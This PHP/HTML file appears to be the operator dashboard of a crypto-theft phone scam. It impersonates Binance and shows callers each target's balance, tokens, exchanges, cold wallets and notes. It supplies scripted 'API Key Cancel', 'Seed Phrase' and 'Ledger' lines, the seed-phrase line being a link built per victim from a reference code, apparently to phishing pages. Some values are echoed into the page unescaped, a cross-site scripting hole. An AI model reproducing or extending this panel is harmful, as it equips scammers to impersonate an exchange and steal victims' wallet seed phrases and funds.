<?php
date_default_timezone_set('Europe/London');
require_once 'functions.php';
require_once 'config/db_config.php';

$agent  = $_GET['agent']  ?? 'Unknown';
$caller = $_GET['caller'] ?? 'Unknown';

$department = 'Unknown';

$last_login = '';
$balance = '';
$tokens = '';
$exchanges = '';
$cold_wallets = '';
$notes = '';
$reference = '';

$conn = getDbConnection();
if ($conn && $agent !== 'Unknown') {
    $eAgent = mysqli_real_escape_string($conn, $agent);

    $sql = "SELECT au.*, ad.department 
            FROM ausers AS au 
            JOIN adminuser AS ad ON au.adminid = ad.id 
            WHERE au.user = '$eAgent' 
            LIMIT 1";
    $result = mysqli_query($conn, $sql);

    if ($row = mysqli_fetch_assoc($result)) {
        $role = strtolower($row['role']);
        $department = $row['department'] ?? '';
        $agent_id = $row['id'] ?? '';

        $userInfo = getUserInfoByAgent($conn, $agent_id);

        if (!$userInfo && !empty($caller)) {
            $agent_id = getAgentIdByCaller($conn, $caller);

            if ($agent_id) {
                $userInfo = getUserInfoByAgent($conn, $agent_id);
            }
        }

        if ($userInfo) {
            $last_login   = $userInfo['last_login']   ?? '';
            $balance      = $userInfo['balance']      ?? '';
            $tokens       = $userInfo['tokens']       ?? '';
            $exchanges    = $userInfo['exchanges']    ?? '';
            $cold_wallets = $userInfo['cold_wallets'] ?? '';
            $notes        = $userInfo['notes']        ?? '';
            $reference    = $userInfo['reference']    ?? '';
        }
    }
}

closeDbConnection($conn);

?>

<!DOCTYPE html>
<html lang="en" class="dark">

<head>
    <meta charset="UTF-8">
    <title>CloseFlow Dashboard</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
    <link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/css/toastr.min.css">
    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/js/toastr.min.js"></script>
    <script>
        tailwind.config = {
            darkMode: 'class',
            theme: {
                extend: {
                    colors: {
                        'binance-brand-gold': '#fcd535',
                        'binance-bg-dark': '#181a20',
                    }
                }
            }
        };
    </script>
    <style>
        #toast-container>div {
            width: 350px;
        }

        .example-toggle {
            transition: background-color 0.2s ease;
        }

        .example-toggle:hover {
            background-color: rgba(255, 255, 255, 0.05);
        }

        .arrow-icon {
            transition: transform 0.5s cubic-bezier(0.25, 0.46, 0.45, 0.94);
            transform-origin: center;
        }

        .example-content {
            overflow: hidden;
        }

        .example-content.hidden {
            display: none !important;
        }

        /* Additional smoothness for the rotation */
        .arrow-icon.rotate-90 {
            transform: rotate(90deg);
        }
    </style>
</head>

<body class="dark:bg-binance-bg-dark bg-white text-white font-sans min-h-screen">
    <header class="border-b border-gray-100 dark:border-gray-800 px-4 py-4">
        <div class=" flex justify-between items-center">
            <div class="flex items-center space-x-2"><a href="/"><img src="./assets/images/Binance_logo.svg" class="w-[120px] h-[24px]" alt="logo"></a></div>
            <button id="themeToggle" class="p-2 rounded-lg text-white hover:text-binance-brand-gold transition-colors duration-200" aria-label="Toggle theme">
                <svg id="moonIcon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" class=" hidden text-[24px] text-white h-6 hover:text-[#F0B90B]">
                    <path fill-rule="evenodd" clip-rule="evenodd" d="M10.5 2h3v3h-3V2zM16 12a4 4 0 11-8 0 4 4 0 018 0zM5.99 3.869L3.867 5.99 5.99 8.112 8.111 5.99 5.989 3.87zM2 13.5v-3h3v3H2zm1.868 4.51l2.121 2.12 2.122-2.12-2.122-2.122-2.121 2.121zM13.5 19v3h-3v-3h3zm4.51-3.112l-2.121 2.122 2.121 2.121 2.121-2.121-2.121-2.122zM19 10.5h3v3h-3v-3zm-3.11-4.51l2.12 2.121 2.122-2.121-2.121-2.121-2.122 2.121z" fill="currentColor"></path>
                </svg>
                <svg id="sunIcon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" class="text-[24px] text-black h-6 hover:text-[#F0B90B]">
                    <path d="M20.968 12.768a7 7 0 01-9.735-9.735 9 9 0 109.735 9.735z" fill="currentColor"></path>
                </svg>
            </button>
        </div>
    </header>
    <div class="px-4 mt-3 mb-4 md:text-start text-center md:flex justify-between items-center">
        <div>
            <h1 class="md:text-3xl text-lg font-bold text-[#232323] dark:text-white">CloseFlow Dashboard</h1>
            <p class="md:text-lg mt-1 text-[#949597]">Revoke access, regenerate seed phrase and protect users from digital asset breaches. </p>
        </div>
        <div class="mt-4 md:mt-0">
            <button id="alert-team-modal" class="bg-[#5dacf8] hover:bg-[#5dacf8] hover:opacity-[0.9] rounded-[8px] py-2 px-4">Alert Team Manager</button>
        </div>
    </div>
    <!-- Alert Team Manager Modal -->
    <div id="alert-modal" class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 hidden">
        <div class="bg-white dark:bg-[#1E2026] rounded-lg shadow-xl max-w-md w-full mx-4 overflow-hidden">
            <div class="px-6 py-4 border-b border-gray-200 dark:border-gray-700 flex justify-between items-center">
                <h3 class="text-lg font-semibold text-gray-900 dark:text-white">Alert Team Manager</h3>
                <button id="close-modal" class="text-gray-400 hover:text-gray-500">
                    <svg class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path>
                    </svg>
                </button>
            </div>
            <div class="p-6">
                <form id="alert-form">
                    <div class="mb-4">
                        <label for="alert-message" class="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-2">Message</label>
                        <textarea id="alert-message" rows="4" class="w-full px-3 py-2 text-gray-700 border rounded-lg focus:outline-none" placeholder="Enter your message for the team manager..."></textarea>
                    </div>
                    <div class="flex justify-end">
                        <button type="button" id="cancel-alert" class="mr-2 px-4 py-2 text-sm font-medium text-gray-700 bg-gray-100 rounded-md hover:bg-gray-200 focus:outline-none dark:bg-gray-700 dark:text-gray-300 dark:hover:bg-gray-600">
                            Cancel
                        </button>
                        <button type="submit" id="alert-team" class="px-4 py-2 text-sm font-medium text-white bg-[#5dacf8] rounded-md hover:bg-opacity-90 focus:outline-none">
                            Send Alert
                        </button>
                    </div>
                </form>
            </div>
        </div>
    </div>

    <!-- Main Container -->
    <div id="main-container" data-department="<?php echo $department; ?>" class="flex justify-center md:px-4 px-2 py-4">
        <div class="md:max-w-md md:min-w-[28rem] w-full relative">

            <!-- Reference Input -->
            <div class="flex items-center space-x-2 mb-8">
                <input value="<?php echo $reference ?>" type="text" id="ref-text" placeholder="Enter Reference" class="flex-1 dark:border-gray-200 dark:border-0 dark:inset-shadow-xs border px-4 py-4 text-black rounded">
                <button id="verified" class="cursor-default bg-[#659c36] px-4 py-[14px] rounded text-white text-xl font-bold">
                    <span>
                        <svg fill="#ffffff" class="w-7" viewBox="0 0 1920 1920" xmlns="http://www.w3.org/2000/svg" stroke="#ffffff">
                            <g id="SVGRepo_bgCarrier" stroke-width="0"></g>
                            <g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g>
                            <g id="SVGRepo_iconCarrier">
                                <path d="M1827.701 303.065 698.835 1431.801 92.299 825.266 0 917.564 698.835 1616.4 1919.869 395.234z" fill-rule="evenodd"></path>
                            </g>
                        </svg>
                    </span>
                </button>
            </div>

            <!-- Buttons and Info Boxes -->

            <?php if ($agent === 'Unknown' || $caller === 'Unknown' || $department === 'Unknown'): ?>
                <div class="absolute inset-0 bg-gray-900 bg-opacity-70 flex flex-col items-center justify-center z-50 rounded">
                    <div class="bg-red-600 text-white px-6 py-4 rounded shadow-lg text-center max-w-xs">
                        <strong>Warning:</strong><br>
                        Agent or Caller or department information is missing from the URL.<br>
                    </div>
                </div>
            <?php endif; ?>

            <div class="space-y-8">
                <!-- API key cancel -->
                <div class="mb-8">
                    <button id="btn-api-cancel" class="text-binance-bg-dark font-semibold bg-binance-brand-gold rounded-[8px] w-[-webkit-fill-available] h-12 text-base py-1.5 px-3 min-w-[48px] hover:opacity-[0.8] hover:bg-binance-brand-gold">API Key Cancel</button>
                    <div class="bg-[#232323] text-white text-sm mt-3 rounded">
                        <div class="flex items-center justify-between p-3 cursor-pointer example-toggle" data-target="api-cancel-example">
                            <strong>Example:</strong>
                            <svg class="w-4 h-4 transform transition-transform arrow-icon" fill="currentColor" viewBox="0 0 20 20">
                                <path fill-rule="evenodd" d="M7.293 14.707a1 1 0 010-1.414L10.586 10 7.293 6.707a1 1 0 011.414-1.414l4 4a1 1 0 010 1.414l-4 4a1 1 0 01-1.414 0z" clip-rule="evenodd"></path>
                            </svg>
                        </div>
                        <div id="api-cancel-example" class="example-content hidden px-3 p-3 border-t border-gray-600">
                            External wallet API connection cancelled. The API keys have been removed from your account and access revoked.
                        </div>
                    </div>
                </div>
                <div class="mb-8">
                    <div class="bg-[#232323] text-white text-sm mt-3 rounded">
                        <div class="flex items-center justify-between p-3">
                            <strong>Qualification:</strong>
                        </div>

                        <div class="space-y-4 p-3 mt-1">
                            <div>
                                <label class="block text-sm font-medium text-white mb-1">🕒 Last Login: <span class="text-gray-300"><?php echo htmlspecialchars($last_login); ?></span></label>

                            </div>
                            <div>
                                <label class="block text-sm font-medium text-white mb-1">💵 Balance: <span class="text-gray-300"><?php echo htmlspecialchars($balance); ?></span></label>

                            </div>
                            <div>
                                <label class="block text-sm font-medium text-white mb-1">🪙 Tokens: <span class="text-gray-300"><?php echo htmlspecialchars($tokens); ?></span></label>

                            </div>
                            <div>
                                <label class="block text-sm font-medium text-white mb-1">🏦 Exchanges: <span class="text-gray-300"><?php echo htmlspecialchars($exchanges); ?></span></label>

                            </div>
                            <div>
                                <label class="block text-sm font-medium text-white mb-1">❄️ Cold Wallets: <span class="text-gray-300"><?php echo htmlspecialchars($cold_wallets); ?></span></label>
                            </div>
                            <div>
                                <label class="block text-sm font-medium text-white mb-1">🗒 VIP Notes: <span class="text-gray-300"><?php echo htmlspecialchars($notes); ?></span></label>
                            </div>
                        </div>
                    </div>

                </div>

                <!-- Seed Phrase -->
                <div class="mb-8">
                    <button id="btn-seed-phrase" class="text-binance-bg-dark font-semibold bg-binance-brand-gold rounded-[8px] w-[-webkit-fill-available] h-12 text-base py-1.5 px-3 min-w-[48px] hover:opacity-[0.8] hover:bg-binance-brand-gold">Seed Phrase</button>
                    <div class="bg-[#232323] text-white text-sm mt-3 rounded">
                        <div class="flex items-center justify-between p-3 cursor-pointer example-toggle" data-target="seed-phrase-example">
                            <strong>Example:</strong>
                            <svg class="w-4 h-4 transform transition-transform arrow-icon" fill="currentColor" viewBox="0 0 20 20">
                                <path fill-rule="evenodd" d="M7.293 14.707a1 1 0 010-1.414L10.586 10 7.293 6.707a1 1 0 011.414-1.414l4 4a1 1 0 010 1.414l-4 4a1 1 0 01-1.414 0z" clip-rule="evenodd"></path>
                            </svg>
                        </div>
                        <div id="seed-phrase-example" class="example-content hidden px-3 p-3 border-t border-gray-600">
                            <span id="seed-url"><?php echo SEED_URL . $reference ?></span>
                        </div>
                    </div>
                </div>

                <!-- Ledger -->
                <div class="mb-8">
                    <button id="btn-ledger" class="text-binance-bg-dark font-semibold bg-binance-brand-gold rounded-[8px] w-[-webkit-fill-available] h-12 text-base py-1.5 px-3 min-w-[48px] hover:opacity-[0.8] hover:bg-binance-brand-gold">Ledger</button>
                    <div class="bg-[#232323] text-white text-sm mt-3 rounded">
                        <div class="flex items-center justify-between p-3 cursor-pointer example-toggle" data-target="ledger-example">
                            <strong>Example:</strong>
                            <svg class="w-4 h-4 transform transition-transform arrow-icon" fill="currentColor" viewBox="0 0 20 20">
                                <path fill-rule="evenodd" d="M7.293 14.707a1 1 0 010-1.414L10.586 10 7.293 6.707a1 1 0 011.414-1.414l4 4a1 1 0 010 1.414l-4 4a1 1 0 01-1.414 0z" clip-rule="evenodd"></path>
                            </svg>
                        </div>
                        <div id="ledger-example" class="example-content hidden px-3 p-3 border-t border-gray-600">
                            <span id="ledger-url"><?php echo LEDGER_URL ?></span>
                        </div>
                    </div>
                </div>

                <!-- Block -->
                <div>
                    <button id="btn-block" class="text-white font-semibold bg-red-500 rounded-[8px] w-[-webkit-fill-available] h-12 text-base py-1.5 px-3 min-w-[48px] hover:opacity-[0.8] hover:bg-red-500">Block</button>
                </div>
            </div>

            <!-- Footer -->
            <div class="mt-6 text-center text-gray-400 text-xs">
                Binance © 2025
            </div>
        </div>
    </div>

    <script src="./assets/js/theme.js"></script>
    <script src="./assets/js/script.js"></script>

</body>

</html>